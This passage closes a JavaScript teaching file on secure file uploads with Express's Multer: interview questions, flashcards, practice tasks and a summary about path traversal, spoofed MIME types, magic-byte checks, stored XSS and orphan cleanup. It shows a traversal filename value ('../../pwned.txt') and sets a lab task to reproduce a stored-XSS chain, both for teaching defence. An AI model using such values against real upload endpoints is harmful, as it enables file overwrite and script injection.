//    file.mimetype is checking the attacker's claim about the attacker's
//    file — you check the magic bytes, and you serve uploads from a
//    different origin with a fixed Content-Type and nosniff, because
//    otherwise a disguised HTML file becomes stored XSS.
//
//    Last: Multer is a body parser, so it writes the file before your
//    handler runs. Every validation in the handler happens after the bytes
//    are on disk. Five requests rejected with 403 still leave five files, so
//    auth and rate limiting go above Multer, cleanup goes in both the
//    rejection path and the error handler, and you still run a sweeper for
//    orphans, because a crash between write and delete leaves one."
//
// The traversal reproduction and "it writes before your handler runs" are
// the two points that separate this from a configuration answer.


// ══════════════════════════════════════════════════════════════════
// § 12 — SENIOR FOLLOW-UP QUESTIONS
// ══════════════════════════════════════════════════════════════════
//
// Q1. Why can't express.json() handle uploads?
// A1. Wrong Content-Type — it skips them silently — and a multipart body may
//     be far too large to buffer and parse as text (§4).
//
// Q2. How does multipart/form-data work?
// A2. A boundary string from the Content-Type separates parts; each part has
//     headers, and Content-Disposition names it and may give a filename (§3).
//
// Q3. Where do text fields go?
// A3. req.body. Files go to req.file / req.files (§4).
//
// Q4. memoryStorage vs diskStorage?
// A4. Whole file in the heap vs a file on disk. Memory only for small,
//     bounded uploads (§5).
//
// Q5. Which limit has no default?
// A5. fileSize. Setting it is the configuration, not hardening (§6).
//
// Q6. Can you trust file.originalname?
// A6. No. It is client-supplied and can contain '../' (§7).
//
// Q7. Can you trust file.mimetype?
// A7. No. It is copied from the part header the client wrote. Check magic
//     bytes (§7).
//
// Q8. Is checking the extension enough?
// A8. No — it is the same client-supplied string, and content and extension
//     are independent (§7).
//
// Q9. When does Multer write the file relative to your handler?
// A9. Before. It is a body parser (§8).
//
// Q10. So what happens to files from rejected requests?
// A10. They stay, unless you delete them explicitly — including from the
//      error handler (§8).
//
// Q11. Where should auth go?
// A11. Above Multer, so unauthorised requests never write anything (§8).
//
// Q12. How do you serve uploads safely afterwards?
// A12. Different origin, fixed Content-Type, nosniff, random names, and
//      never from a directory that also contains anything else (09 §8, 11 §5).
//
// Q13. What does a fileSize limit NOT protect against?
// A13. Decompression bombs — a small upload that expands enormously when
//      decoded. Limit the decoded dimensions/size too.
//
// Q14. How would you handle a 2 GB upload properly?
// A14. Don't proxy it through Node at all: issue a pre-signed URL and let
//      the client upload directly to object storage, then verify server-side.
//
// Q15. req.file vs req.files?
// A15. single() populates req.file; array()/fields() populate req.files.
//      Assuming req.file exists is a common TypeError (§9 Bug 12).


// ══════════════════════════════════════════════════════════════════
// § 13 — FLASHCARDS
// ══════════════════════════════════════════════════════════════════
//
// Flashcard 1:
//   Front: Why doesn't express.json() work for uploads?
//   Back : Wrong Content-Type — it calls next() silently.
//
// Flashcard 2:
//   Front: What separates multipart parts?
//   Back : The boundary string from the Content-Type header.
//
// Flashcard 3:
//   Front: Fields vs files land where?
//   Back : req.body vs req.file / req.files.
//
// Flashcard 4:
//   Front: memoryStorage cost?
//   Back : The whole file in the heap × concurrency.
//
// Flashcard 5:
//   Front: Which limit has no default?
//   Back : fileSize.
//
// Flashcard 6:
//   Front: file.originalname as a destination?
//   Back : Path traversal. Use random bytes + a sanitised extension.
//
// Flashcard 7:
//   Front: file.mimetype trustworthy?
//   Back : No — the client wrote it. Check magic bytes.
//
// Flashcard 8:
//   Front: When does the file get written?
//   Back : Before your handler. It's a body parser.
//
// Flashcard 9:
//   Front: Rejected request → ?
//   Back : The file is already on disk. Clean up explicitly.
//
// Flashcard 10:
//   Front: Best way to accept very large files?
//   Back : Pre-signed direct upload to object storage.
//
// Flashcard 11:
//   Front: How do you sound senior?
//   Back : "The filename and the mimetype are both strings the client wrote
//          — I treat neither as data about the file."


// ══════════════════════════════════════════════════════════════════
// § 14 — PRACTICE TASKS
// ══════════════════════════════════════════════════════════════════
//
// Task 1:
//   Convert the parser in §3 to stream parts to disk as they arrive instead
//   of buffering the whole request. Measure the heap difference on a 50 MB
//   upload.
//
// Task 2:
//   Add upload.single('photo') / upload.array('photos', 5) semantics and
//   prove LIMIT_UNEXPECTED_FILE fires for an unexpected field name.
//
// Task 3:
//   Write a magic-byte detector for PNG, JPEG, PDF and GIF, and reject any
//   file whose bytes disagree with its extension.
//
// Task 4:
//   Move auth above multer in §8's leaky app and prove zero files are
//   written for unauthenticated requests.
//
// Task 5:
//   Add cleanup to the ERROR handler as well as the rejection path, then
//   throw from the handler and confirm nothing is left behind.
//
// Task 6:
//   Write the orphan sweeper: delete files in the upload directory older
//   than one hour. Why is mtime the wrong clock if you also move files?
//
// Task 7:
//   Serve the upload directory with express.static and demonstrate the
//   stored-XSS chain end to end with §7's disguised file. Then fix it with
//   a fixed Content-Type and nosniff (11 §5).
//
// Task 8:
//   Implement the pre-signed-URL flow in outline: your API returns an
//   upload URL, the client PUTs to storage, then calls back to confirm.
//   What must the confirm step verify, and why can it not trust the client?


// ══════════════════════════════════════════════════════════════════
// § 15 — FINAL INTERVIEW SUMMARY
// ══════════════════════════════════════════════════════════════════
//
// If you remember only one thing:
//   Multer is a body parser for multipart/form-data — so it writes the file
//   BEFORE your handler runs, and everything you validate happens after the
//   bytes already landed.
//
// If you remember the common bug:
//   file.originalname used as the destination filename: '../../pwned.txt'
//   escapes the upload directory, and two users' photo.png overwrite each
//   other.
//
// If you remember the professional framing:
//   diskStorage or direct-to-object-storage, an explicit fileSize limit,
//   random filenames, magic-byte checks rather than mimetype, auth and rate
//   limiting above the parser, explicit cleanup on every failure path, and
//   uploads served from a separate origin.
//
// ─────────────────────────────────────────────────────────────────
// Bodies are finished. The remaining middleware in this group are about
// identity across requests — starting with the header that carries it, and
// the parser that turns it into an object.
//
// NEXT TOPIC -> 15_cookie-parser.js
// ─────────────────────────────────────────────────────────────────


(async function main() {
  try {
    await section4();
    await section5();
    await section6();
    await section7();
    await section8();
    assertions();
  } finally {
    fs.rmSync(TMP, { recursive: true, force: true });
    console.log("\n  (temporary upload directories removed)");
  }
})();
